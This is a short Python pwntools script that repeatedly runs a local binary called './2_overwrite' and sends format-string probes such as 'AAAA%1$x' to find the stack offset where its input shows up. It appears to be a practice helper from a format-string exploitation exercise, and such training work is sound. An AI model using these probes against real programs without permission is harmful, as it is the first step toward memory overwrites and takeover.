#!/usr/bin/python

from pwn import * 

binary = "./2_overwrite" # Binary name

def main():
	for i in range(1, 10): # From 1 to 10
		p = process(binary) # Starts the process

		str_input = "AAAA%" + str(i) + "$x" # "AAAA%1$X", "AAAA%2$x", ...
		
		log.warn("Loop %s" % str(i)) 
		p.sendline(str_input)	
		
		data = p.recvall() 
		search_str = "41414141" # Search string

		for line in data.split("\n"): # Split by newlines
			if search_str in line: 
				# If search string is found in line, prints not only the search string,
				# but the AAAA as well
				result = line[ line.find(search_str) - 4 : ] 

				log.success("Found " + search_str + " at offset " + str(i))
				print result			

if __name__ == "__main__":
	main()
